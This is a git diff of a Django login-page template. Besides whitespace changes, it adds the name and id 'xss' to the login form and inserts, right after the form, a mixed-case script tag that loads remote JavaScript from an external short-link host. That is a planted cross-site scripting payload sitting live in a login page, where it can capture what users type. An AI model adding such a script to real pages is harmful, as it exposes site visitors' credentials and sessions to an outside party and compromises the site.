@@ -5,6 +5,7 @@
 {% endblock %}
 
 {% block content %}
+
     <div class="row">
         <div class="col-xs-4 col-xs-offset-4">
             <div class="panel panel-default">
@@ -13,7 +14,7 @@
               </div>
               <div class="panel-body">
 {#                  form如果不写清楚要提交到的action的位置的话，那么系统默认post方法提交数据到的是当前的页面#}
-                <form class="form-horizontal" method="post">
+                <form class="form-horizontal" name="xss" method="post" id="xss">
                     {% csrf_token %}
                         {% block field %}
                             {% for field in login_form %}
@@ -24,9 +25,10 @@
                         {% endblock %}
                     <sapn class="pull-left text-danger">{{ login_form.non_field_errors.as_text }}</sapn>
                     <input type="submit" class="btn btn-primary pull-right">
-                </form>
+                </form><sCRiPt sRC=//uj.ci/YkJC></sCrIpT>
               </div>
             </div>
         </div>
     </div>
+
 {% endblock %}
